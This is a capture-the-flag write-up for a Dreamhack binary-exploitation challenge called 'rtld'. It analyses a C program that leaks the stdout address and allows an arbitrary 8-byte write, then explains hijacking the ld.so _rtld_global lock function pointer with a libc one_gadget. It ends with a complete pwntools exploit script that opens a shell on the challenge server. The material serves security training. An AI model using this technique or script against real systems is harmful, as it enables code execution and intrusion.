---
title: "[Dreamhack] rtld - Write up"
date: 2024-01-13 00:00:00 +0700
categories: [Dreamhack, Binary Exploitation]
tags: [pwn, arbitrary-write, rtld, one-gadget, dreamhack]
author: datious
---
[Write up for dreamhack]__Challenge: rtld | Author: datious

1. Analyzing the source code
rtld.c
```
// gcc -o rtld rtld.c -fPIC -pie

#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <dlfcn.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
    signal(SIGALRM, alarm_handler);
    alarm(60);
}

void get_shell() {
    system("/bin/sh");
}

int main()
{
    long addr;
    long value; 

    initialize();

    printf("stdout: %p\n", stdout);

    printf("addr: ");
    scanf("%ld", &addr);

    printf("value: ");
    scanf("%ld", &value);

    *(long *)addr = value;
    return 0;
}

```
Checksec: PIE, Partial RelRO, Canary found, NX enable.
The program provides:
    - stdout address: the value of stdout pointer, it points to **_IO_2_1_stdout_** struction into libc.
    - Allowing user write 8 bytes into any address  ****(long*)addr=value**  , no limit.

We don't have any ways to leak binary address, so we can't return to get_shell() function.

But I found three one_gadgets in the libc file. We can use this to execute  **execve("/bin/sh").**

2. The idea to exploit: Hijack the function pointer in **ld.so**
- After main() return, glibc constant run exit()-> __run_exit_handlers() -> _dl_fini() (in ld.so), it have responsible to run destructor of others shared object was loaded. Before inspection, it lock a mutex by macro.

```
#define __rtld_lock_lock_recursive(NAME) \
    GL(dl_rtld_lock_recursive) (&(NAME).mutex)

void _dl_fini(void) {
    ...
    __rtld_lock_lock_recursive(GL(dl_load_lock));   // gọi qua CON TRỎ HÀM
    ...
}
```
GL(dl_rtld_lock_recursive) is a pointer funtion placed in global struction, _rtld_global inside ld.so, always is called when program exit- Not depend on code of rtld.c.

- Strategy: use arbitrary-write for overwrite this pointer by one_gadgets address in libc. When _dl_fini is running, it's unintentional call one_gadgets -> execve("/bin/sh").

3. Calculate addresses.
```
leak (stdout):
-> libc_base=leak-offset(_IO_2_1_stdout_) # 0x3c5620 with libc-2.23 version.
-> ld_base= libc_base+offset_GAP(from libc base to ld base).
-> rtld_global=ld_base+offset_to_rtld_global (0x226040). _rtld_global in ld.so
-> dl_rtld_lock_recursive = _rtld_global + 0xf08 (field offset of function)

Write:
    addr = dl_rtld_lock_recursive
    value = libc.address+ one_gadgets offset


```

4. Stuck on solving processing and how to debug.
- The GAP(libc->ld.so) value was wrong:
    + The first time, I used GAP = 0x400000 (guessing each pattern which is usually matched) -> Running on local is pass, running on server is fail. The reason: this number is success on local machine due to ASLR/kernel local is matched with least bit, not real constant number.
    + Verify again by vmmap in gdb (intercept when program loaded libc+ld.so).

```
0x00007f3778981000  libc-2.23.so   (base)
0x00007f3778d4b000  ld-2.23.so     (base)

GAP = 0x00007f3778d4b000 - 0x00007f3778981000 = 0x3ca000
```

- The correct GAP is 0x3ca000. This is a constant number always correct with libc/ld.so.

5. Script (Verified)
```
#!/usr/bin/python3
from pwn import *
import sys

context.log_level = 'info'

exe  = ELF('./rtld_patched', checksec=False)
libc = ELF('./libc-2.23.so', checksec=False)
ld   = ELF('./ld-2.23.so', checksec=False)

REMOTE_HOST = "host3.dreamhack.games"
REMOTE_PORT = 8786
USE_REMOTE  = len(sys.argv) > 1 and sys.argv[1].upper() == 'REMOTE'

# tất cả offset lấy từ `one_gadget libc-2.23.so`, thêm/bớt nếu list bên bạn khác
ONE_GADGETS = [0x45226, 0x4527a, 0xf03a4, 0xcc7f0]

RTLD_GLOBAL_OFF = 0x226040
LOCK_OFF        = 0xf08
STDOUT_OFF      = 0x3c5620
LIBC_LD_GAP     = 0x3ca000   # nếu bạn đã verify bằng vmmap ra số khác, sửa ở đây


def start():
    return remote("host3.dreamhack.games",10851)



def try_gadget(gadget_off, timeout=5):
    p = start()
    try:
        p.recvuntil(b'stdout: ', timeout=timeout)
        leak = int(p.recvline(timeout=timeout), 16)

        libc.address = leak - STDOUT_OFF
        ld.address   = libc.address + LIBC_LD_GAP

        rtld_global = ld.address + RTLD_GLOBAL_OFF
        lock_ptr    = rtld_global + LOCK_OFF
        one_gadget  = libc.address + gadget_off

        log.info(f"[gadget {hex(gadget_off)}] libc={hex(libc.address)} "
                  f"ld={hex(ld.address)} lock_ptr={hex(lock_ptr)} "
                  f"target={hex(one_gadget)}")

        p.sendlineafter(b'addr: ', str(lock_ptr), timeout=timeout)
        p.sendlineafter(b'value: ', str(one_gadget), timeout=timeout)

        # sau write, process return khỏi main() -> exit() -> _dl_fini() -> gadget chạy
        # gửi 1 lệnh + marker để xác nhận có shell thật, không phải rác/echo lỗi
        marker = b"PWNED_%d" % gadget_off
        p.sendline(b"echo " + marker)
        out = p.recvrepeat(timeout=2)

        if marker in out:
            log.success(f"Gadget {hex(gadget_off)} -> SHELL OK!")
            return p
        else:
            log.warning(f"Gadget {hex(gadget_off)} -> khong ra shell (output: {out[:200]})")
            p.close()
            return None
    except Exception as e:
        log.warning(f"Gadget {hex(gadget_off)} -> loi/crash: {e}")
        try:
            p.close()
        except Exception:
            pass
        return None


def main():
    for g in ONE_GADGETS:
        shell = try_gadget(g)
        if shell is not None:
            log.success(f"=> Dung gadget: {hex(g)}")
            shell.interactive()
            return
    log.failure("Khong co gadget nao work. Can kiem tra lai LIBC_LD_GAP / offset lock_ptr "
                "bang gdb (vmmap luc _dl_fini goi ham lock).")


if __name__ == "__main__":
    main()
```

6. Remediation.
- Don't allow the user to have write permission on the address.

Goodluck!!!